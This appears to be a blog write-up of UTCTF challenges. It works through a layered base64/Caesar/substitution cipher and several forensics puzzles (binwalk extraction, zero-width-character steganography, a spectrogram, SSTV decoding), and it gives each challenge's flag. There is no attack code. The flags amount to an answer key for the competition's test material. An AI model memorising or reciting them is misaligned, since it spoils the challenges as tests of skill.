TmV3IGNoYWxsZW5nZSEgQ2FuIHlvdSBmaWd1cmUgb3V0IHdoYXQncyBnb2luZyBvbiBoZXJlPyBJdCBsb29rcyBsaWtlIHRoZSBsZXR0ZXJzIGFyZSBzaGlmdGVkIGJ5IHNvbWUgY29uc3RhbnQuIChoaW50OiB5b3UgbWlnaHQgd2FudCB0byBzdGFydCBsb29raW5nIHVwIFJvbWFuIHBlb3BsZSkuCmt2YnNxcmQsIGl5ZSdibyBrdnd5Y2QgZHJvYm8hIFh5ZyBweWIgZHJvIHBzeGt2IChreG4gd2tpbG8gZHJvIHJrYm5vY2QuLi4pIHprYmQ6IGsgY2VsY2RzZGVkc3l4IG1zenJvYi4gU3ggZHJvIHB5dnZ5Z3N4cSBkb2hkLCBTJ2ZvIGRrdW94IHdpIHdvY2NrcW8ga3huIGJvenZrbW9uIG9mb2JpIGt2enJrbG9kc20gbXJrYmttZG9iIGdzZHIgayBteWJib2N6eXhub3htbyBkeSBrIG5zcHBvYm94ZCBtcmtia21kb2IgLSB1eHlneCBrYyBrIGNlbGNkc2RlZHN5eCBtc3pyb2IuIE1reCBpeWUgcHN4biBkcm8gcHN4a3YgcHZrcT8gcnN4ZDogR28gdXh5ZyBkcmtkIGRybyBwdmtxIHNjIHF5c3hxIGR5IGxvIHlwIGRybyBweWJ3a2QgZWRwdmtxey4uLn0gLSBncnNtciB3b2t4YyBkcmtkIHNwIGl5ZSBjb28gZHJrZCB6a2Rkb2J4LCBpeWUgdXh5ZyBncmtkIGRybyBteWJib2N6eXhub3htb2MgcHliIGUsIGQsIHAsIHYgaywga3huIHEga2JvLiBJeWUgbWt4IHpieWxrbHZpIGd5YnUgeWVkIGRybyBib3drc3hzeHEgbXJrYmttZG9iYyBsaSBib3p2a21zeHEgZHJvdyBreG4gc3hwb2Jic3hxIG15d3d5eCBneWJuYyBzeCBkcm8gT3hxdnNjciB2a3hxZWtxby4gS3h5ZHJvYiBxYm9rZCB3b2RyeW4gc2MgZHkgZWNvIHBib2Flb3htaSBreGt2aWNzYzogZ28gdXh5ZyBkcmtkICdvJyBjcnlnYyBleiB3eWNkIHlwZG94IHN4IGRybyBrdnpya2xvZCwgY3kgZHJrZCdjIHpieWxrbHZpIGRybyB3eWNkIG15d3d5eCBtcmtia21kb2Igc3ggZHJvIGRvaGQsIHB5dnZ5Z29uIGxpICdkJywga3huIGN5IHl4LiBZeG1vIGl5ZSB1eHlnIGsgcG9nIG1ya2JrbWRvYmMsIGl5ZSBta3ggc3hwb2IgZHJvIGJvY2QgeXAgZHJvIGd5Ym5jIGxrY29uIHl4IG15d3d5eCBneWJuYyBkcmtkIGNyeWcgZXogc3ggZHJvIE94cXZzY3Igdmt4cWVrcW8uCnJnaG54c2RmeXNkdGdodSEgcWdmIGlzYWsgY3RodHVpa2UgZGlrIHprbnRoaGt4IHJ4cWxkZ254c2xpcSByaXN5eWtobmsuIGlreGsgdHUgcyBjeXNuIGNneCBzeXkgcWdmeCBpc3hlIGtjY2d4ZHU6IGZkY3lzbntoMHZfZGk0ZHVfdmk0ZF90X3I0eXlfcnhxbGQwfS4gcWdmIHZ0eXkgY3RoZSBkaXNkIHMgeWdkIGdjIHJ4cWxkZ254c2xpcSB0dSBwZnVkIHpmdHlldGhuIGdjYyBkaXR1IHVneGQgZ2MgenN1dHIgYmhndnlrZW5rLCBzaGUgdGQgeGtzeXlxIHR1IGhnZCB1ZyB6c2Ugc2Nka3ggc3l5LiBpZ2xrIHFnZiBraHBncWtlIGRpayByaXN5eWtobmsh
```

Alright, that kinda looks like base64, so we'll try that then:

```bash
echo 'TmV3IGNoYWxsZW5nZSEgQ2FuIHlvdSBmaWd1cmUgb3V0IHdoYXQncyBnb2luZyBvbiBoZXJlPyBJdCBsb29rcyBsaWtlIHRoZSBsZXR0ZXJzIGFyZSBzaGlmdGVkIGJ5IHNvbWUgY29uc3RhbnQuIChoaW50OiB5b3UgbWlnaHQgd2FudCB0byBzdGFydCBsb29raW5nIHVwIFJvbWFuIHBlb3BsZSkuCmt2YnNxcmQsIGl5ZSdibyBrdnd5Y2QgZHJvYm8hIFh5ZyBweWIgZHJvIHBzeGt2IChreG4gd2tpbG8gZHJvIHJrYm5vY2QuLi4pIHprYmQ6IGsgY2VsY2RzZGVkc3l4IG1zenJvYi4gU3ggZHJvIHB5dnZ5Z3N4cSBkb2hkLCBTJ2ZvIGRrdW94IHdpIHdvY2NrcW8ga3huIGJvenZrbW9uIG9mb2JpIGt2enJrbG9kc20gbXJrYmttZG9iIGdzZHIgayBteWJib2N6eXhub3htbyBkeSBrIG5zcHBvYm94ZCBtcmtia21kb2IgLSB1eHlneCBrYyBrIGNlbGNkc2RlZHN5eCBtc3pyb2IuIE1reCBpeWUgcHN4biBkcm8gcHN4a3YgcHZrcT8gcnN4ZDogR28gdXh5ZyBkcmtkIGRybyBwdmtxIHNjIHF5c3hxIGR5IGxvIHlwIGRybyBweWJ3a2QgZWRwdmtxey4uLn0gLSBncnNtciB3b2t4YyBkcmtkIHNwIGl5ZSBjb28gZHJrZCB6a2Rkb2J4LCBpeWUgdXh5ZyBncmtkIGRybyBteWJib2N6eXhub3htb2MgcHliIGUsIGQsIHAsIHYgaywga3huIHEga2JvLiBJeWUgbWt4IHpieWxrbHZpIGd5YnUgeWVkIGRybyBib3drc3hzeHEgbXJrYmttZG9iYyBsaSBib3p2a21zeHEgZHJvdyBreG4gc3hwb2Jic3hxIG15d3d5eCBneWJuYyBzeCBkcm8gT3hxdnNjciB2a3hxZWtxby4gS3h5ZHJvYiBxYm9rZCB3b2RyeW4gc2MgZHkgZWNvIHBib2Flb3htaSBreGt2aWNzYzogZ28gdXh5ZyBkcmtkICdvJyBjcnlnYyBleiB3eWNkIHlwZG94IHN4IGRybyBrdnpya2xvZCwgY3kgZHJrZCdjIHpieWxrbHZpIGRybyB3eWNkIG15d3d5eCBtcmtia21kb2Igc3ggZHJvIGRvaGQsIHB5dnZ5Z29uIGxpICdkJywga3huIGN5IHl4LiBZeG1vIGl5ZSB1eHlnIGsgcG9nIG1ya2JrbWRvYmMsIGl5ZSBta3ggc3hwb2IgZHJvIGJvY2QgeXAgZHJvIGd5Ym5jIGxrY29uIHl4IG15d3d5eCBneWJuYyBkcmtkIGNyeWcgZXogc3ggZHJvIE94cXZzY3Igdmt4cWVrcW8uCnJnaG54c2RmeXNkdGdodSEgcWdmIGlzYWsgY3RodHVpa2UgZGlrIHprbnRoaGt4IHJ4cWxkZ254c2xpcSByaXN5eWtobmsuIGlreGsgdHUgcyBjeXNuIGNneCBzeXkgcWdmeCBpc3hlIGtjY2d4ZHU6IGZkY3lzbntoMHZfZGk0ZHVfdmk0ZF90X3I0eXlfcnhxbGQwfS4gcWdmIHZ0eXkgY3RoZSBkaXNkIHMgeWdkIGdjIHJ4cWxkZ254c2xpcSB0dSBwZnVkIHpmdHlldGhuIGdjYyBkaXR1IHVneGQgZ2MgenN1dHIgYmhndnlrZW5rLCBzaGUgdGQgeGtzeXlxIHR1IGhnZCB1ZyB6c2Ugc2Nka3ggc3l5LiBpZ2xrIHFnZiBraHBncWtlIGRpayByaXN5eWtobmsh' | base64 -D

New challenge! Can you figure out what's going on here? It looks like the letters are shifted by some constant. (hint: you might want to start looking up Roman people).
kvbsqrd, iye'bo kvwycd drobo! Xyg pyb dro psxkv (kxn wkilo dro rkbnocd...) zkbd: k celcdsdedsyx mszrob. Sx dro pyvvygsxq dohd, S'fo dkuox wi wocckqo kxn bozvkmon ofobi kvzrklodsm mrkbkmdob gsdr k mybboczyxnoxmo dy k nsppoboxd mrkbkmdob - uxygx kc k celcdsdedsyx mszrob. Mkx iye psxn dro psxkv pvkq? rsxd: Go uxyg drkd dro pvkq sc qysxq dy lo yp dro pybwkd edpvkq{...} - grsmr wokxc drkd sp iye coo drkd zkddobx, iye uxyg grkd dro mybboczyxnoxmoc pyb e, d, p, v k, kxn q kbo. Iye mkx zbylklvi gybu yed dro bowksxsxq mrkbkmdobc li bozvkmsxq drow kxn sxpobbsxq mywwyx gybnc sx dro Oxqvscr vkxqekqo. Kxydrob qbokd wodryn sc dy eco pboaeoxmi kxkvicsc: go uxyg drkd 'o' crygc ez wycd ypdox sx dro kvzrklod, cy drkd'c zbylklvi dro wycd mywwyx mrkbkmdob sx dro dohd, pyvvygon li 'd', kxn cy yx. Yxmo iye uxyg k pog mrkbkmdobc, iye mkx sxpob dro bocd yp dro gybnc lkcon yx mywwyx gybnc drkd cryg ez sx dro Oxqvscr vkxqekqo.
rghnxsdfysdtghu! qgf isak cthtuike dik zknthhkx rxqldgnxsliq risyykhnk. ikxk tu s cysn cgx syy qgfx isxe kccgxdu: fdcysn{h0v_di4du_vi4d_t_r4yy_rxqld0}. qgf vtyy cthe disd s ygd gc rxqldgnxsliq tu pfud zftyethn gcc ditu ugxd gc zsutr bhgvykenk, she td xksyyq tu hgd ug zse scdkx syy. iglk qgf khpgqke dik risyykhnk!
```

OK - Ceasar's cipher, the flag looks to be here: `... fdcysn{h0v_di4du_vi4d_t_r4yy_rxqld0} ...`. We can try to find the shift of the caesar cipher using a trivial python function:

```python
key="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
def decrypt(n, ciphertext):
  result=''
  for l in ciphertext:
    try:
      i=(key.index(l) -n) % 26
      result +=key[i]
    except ValueError:
      result += l
  return result
```
Then, in the interpreter:

```python
# To try to find the shift, look for one that is legible
>>> for i in range(1, 26):
...   decrypt(i, blah)
...   print("\n===\n")
...
# Rerun with that index to be sure:
>>> decrypt(10, blah)
"alright, you're almost there! now for the final (and maybe the hardest...) part: a substitution cipher. in the following text, i've taken my message and replaced every alphabetic character with a correspondence to a different character - known as a substitution cipher. can you find the final flag? hint: we know that the flag is going to be of the format utflag{...} - which means that if you see that pattern, you know what the correspondences for u, t, f, l a, and g are. you can probably work out the remaining characters by replacing them and inferring common words in the english language. another great method is to use frequency analysis: we know that 'e' shows up most often in the alphabet, so that's probably the most common character in the text, followed by 't', and so on. once you know a few characters, you can infer the rest of the words based on common words that show up in the english language.\nhwxdnitvoitjwxk! gwv yiqa sjxjkyau tya padjxxan hngbtwdnibyg hyiooaxda. yana jk i soid swn ioo gwvn yinu asswntk: vtsoid{x0l_ty4tk_ly4t_j_h4oo_hngbt0}. gwv ljoo sjxu tyit i owt ws hngbtwdnibyg jk fvkt pvjoujxd wss tyjk kwnt ws pikjh rxwloauda, ixu jt naioog jk xwt kw piu istan ioo. ywba gwv axfwgau tya hyiooaxda!"
```

OK - now a substitution cipher. So we have to try to find all the various letter substitutions. We can start with some that we for sure know, and work backwards:

```python
#!/usr/bin/env python3

tosub=""".\nhwxdnitvoitjwxk! gwv yiqa sjxjkyau tya padjxxan hngbtwdnibyg hyiooaxda. yana jk i soid swn ioo gwvn yinu asswntk: vtsoid{x0l_ty4tk_ly4t_j_h4oo_hngbt0}. gwv ljoo sjxu tyit i owt ws hngbtwdnibyg jk fvkt pvjoujxd wss tyjk kwnt ws pikjh rxwloauda, ixu jt naioog jk xwt kw piu istan ioo. ywba gwv axfwgau tya hyiooaxda!"""
# We know vtsoid{... is:
#         utflag{...

tosub=tosub.replace("v","u")
tosub=tosub.replace("t","t")
tosub=tosub.replace("s","f")
tosub=tosub.replace("o","l")
tosub=tosub.replace("i","a")
tosub=tosub.replace("d","g")

print(tosub)

hwxgnatulatjwxk! gwu yaqa fjxjkyau tya pagjxxan hngbtwgnabyg hyallaxga. yana jk a flag fwn all gwun yanu affwntk: utflag{x0l_ty4tk_ly4t_j_h4ll_hngbt0}. gwu ljll fjxu tyat a lwt wf hngbtwgnabyg jk fukt pujlujxg wff tyjk kwnt wf pakjh rxwllauga, axu jt naallg jk xwt kw pau aftan all. ywba gwu axfwgau tya hyallaxga!
```

`hyallaxga!`` looks like challenge, so we can sub those letters in. Then we get:

```bash
congnatuwations! gou haqa finishau tha paginnan cngbtognabhg chawwanga. hana is a fwag fon aww goun hanu affonts: utfwag{n0w_th4ts_wh4t_i_c4ww_cngbt0}. gou wiww finu that a wot of cngbtognabhg is fust puiwuing off this sont of pasic nnowwauga, anu it naawwg is not so pau aftan aww. hoba gou anfogau tha chawwanga!
```

So kinda incoherent, but meh its late at this point, but looks like `utflag{n0w_th4ts_wh4t_i_c4ll_crypt0}`?

Bingo. Flag is `utflag{n0w_th4ts_wh4t_i_c4ll_crypt0}`.

&nbsp;
&nbsp;
---

# Forensics


## Sanity Check -- 1
> The flag is utflag{this_is_the_flag}! Welcome to UTCTF!

Flag is `utflag{this_is_the_flag}!`

&nbsp;
&nbsp;
---

## Observe Closely -- 50
> A simple image with a couple of twists...

Download the attachment, `Griffith_Observatory.png`. Opening it up, looks like a normal image.

Check the file type:

```bash
file Griffith_Observatory.png
Griffith_Observatory.png: PNG image data, 320 x 155, 8-bit/color RGBA, non-interlaced
```

Looks normal. What about `strings`?

```bash
strings
...
hidden_binaryUT
...
```

Huh, that doesn't seem  normal. I'll use [binwalk](https://github.com/ReFirmLabs/binwalk) to examine what the embedded binary is.

```bash
binwalk -e Griffith_Observatory.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 320 x 155, 8-bit/color RGBA, non-interlaced
41            0x29            Zlib compressed data, default compression
127759        0x1F30F         Zip archive data, at least v2.0 to extract, compressed size: 2587, uncompressed size: 16664, name: hidden_binary
130500        0x1FDC4         End of Zip archive, footer length: 22

ls _Griffith_Observatory.png.extracted
      1F30F.zip       29       29.zlib       hidden_binary
```

Executing `hidden_binary`:

```bash
/hidden_binary
Ah, you found me!
utflag{2fbe9adc2ad89c71da48cabe90a121c0}
```

Sweet!

Flag is `utflag{2fbe9adc2ad89c71da48cabe90a121c0}`.

&nbsp;
&nbsp;
---

## [basics] forensics -- 50
> My friend said they hid a flag in this picture, but it's broken! Now that I think about it, I don't even know if it really is a picture...

Download the attachment `secret.jpeg`.

```bash
file secret.jpeg
secret.jpeg: UTF-8 Unicode text, with CRLF line terminators
```

Huh... text? `cat`, profit?

```bash
cat secret.jpeg | grep utf
not have omitted him in his hero’s outfit, which he obviously meant to
utflag{fil3_ext3nsi0ns_4r3nt_r34l}
```

Sweet!

Flag is `utflag{fil3_ext3nsi0ns_4r3nt_r34l}`.

&nbsp;
&nbsp;
---

## Zero -- 1858
> This file seems to be too large given how much text it contains, but I can find zero evidence of the flag. Maybe you'll have better luck than me?

* Forensics

So, download the file: `zero.txt`

Looking at it:

```bash
file zero.txt
zero.txt: UTF-8 Unicode (with BOM) text, with very long lines, with no line terminators

cat zero.txt
​​​​​​​​Lorem ipsum​​​​​​​ dolor ‌‍﻿‍‍‍‍sit​​​​​​​​ amet​​​​​​​​​‌‍﻿‍, consectetur ​​​​​​​adipiscing​​​​​​​‌‍‬‍‬ elit​​​​​​​.‌‍‬​​​​​​​‌‍‬‌‍ Phasellus quis​​​​​​​ tempus​​​​​​ ante, ​​​​​​​​nec vehicula​​​​​​​​​​​​​​​​ mi​​​​​​​​. ​​​​​​​‌‍‬‍Aliquam nec​​​​​​​​​‌‍‬ nisi ut neque​​​​​​​ interdum auctor​​​​​​​.‌‍﻿‍ Aliquam felis ‌‍‬‬orci​​​​​​​, vestibulum ‌‍‬‍sit ​​​​​​​amet​​​​​​​​​ ante‌‍‬ at​​​​​​​, consectetur‌‍ lobortis eros​​​​​​​​​.‌‍‍‍‍‍‍ ‌‍​​​​​​​Orci varius​​​​​​​ ​​​​​​​natoque ‌‍penatibus et ‌‍‬​​​​​​​magnis‌‍‌‍ dis ​​​​​​​‌‍‍‍‍parturient montes, ​​​​​​​nascetur ridiculus ‍​​​​​​​​​​​​​​‬‍mus. In finibus‬ magna​​​​​​﻿‍ mauris, quis‌‍‬‌‍ auctor ‌‍‬‌‍libero congue quis. ‌‍‬‬‬Duis‌‍‬‬ sagittis consequat urna non tristique. Pellentesque eu lorem ‌‍‌‍id‌‍‬‬ quam vestibulum ultricies vel ac purus‌‍.‍‌‍﻿‍
```

Looking at it in `vim`, see things like `<200b>`, which are Unicode for zero-width space, [see](https://unicode-table.com/en/200B/).

So, looking up a zero-width space decoder on google, first link [here](https://330k.github.io/misc_tools/unicode_steganography.html):

{{< image src="/img/steg_fixed_width.png" alt="steg_fixed_width.png" position="center" style="border-radius: 8px;" >}}

Flag is `utflag{whyNOT@sc11_4927aajbqk14}`.

&nbsp;
&nbsp;
---

## Spectre -- 50
> I found this audio file, but I don't think it's any song I've ever heard... Maybe there's something else inside?

We're given a download, `song.wav`.

So, indeed, sounds like garbage, so flag isn't just stated in the song. _maybe there's something else inside_: well, let's make sure it's not just a misnamed file:

```bash
file song.wav
song.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, mono 44100 H
```

OK - looks legit. To confirm, can `cat`/`vim`/whatever to inspect the contents, and they do look to valid.

The name of the challenge _Spectre_, sounds kind of like spectrogram, so it makes me think we need to look for a spectrogram?

Using Audacity, we can enable [Spectrogram view](https://manual.audacityteam.org/man/spectrogram_view.html).

And, look at that:

{{< image src="/img/spectrogram.png" alt="spectrogram.png" position="center" style="border-radius: 8px;" >}}

Flag is: `utflag{sp3tr0gr4m0ph0n3}`.

&nbsp;
&nbsp;
---

## 1 Frame per Minute -- 50
> I recently received this signal transmission known as SSTV in a mode called Martian? This technology is all very old so I'm not sure what to do with it. Could you help me out?

We're given a download: `signals.wav`.

Inspecting the file:

```bash
file signals.wav
signals.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 48000 Hz
```

If you listen to it on some audio player, it sounds... not good. A bit of googling shows that the file seems like it might be used as a Slow-Scan Television file.

The downside: Trying to inspect this on a Mac is _impossible_ from what I could tell. Not possible. Eventually I just gave up, deleted my Windows VM (since my 2013 laptop is barely making it as is) and started up a fresh [Ubuntu 18.04 VM](https://ubuntu.com/download/desktop).

Once setup, I looked into qsstv and directly reading a file to it using some additional configurations in Ubuntu, via a guide [here](https://www.chonky.net/hamradio/decoding-sstv-from-a-file-on-a-linux-system).

The end product:

{{< image src="/img/signals_qsstv.png" alt="signals_qsstv.png" position="center" style="border-radius: 8px;" >}}

Flag is: `utflag{6bdfeac1e2baa12d6ac5384cdfd166b0}`

&nbsp;
&nbsp;
---


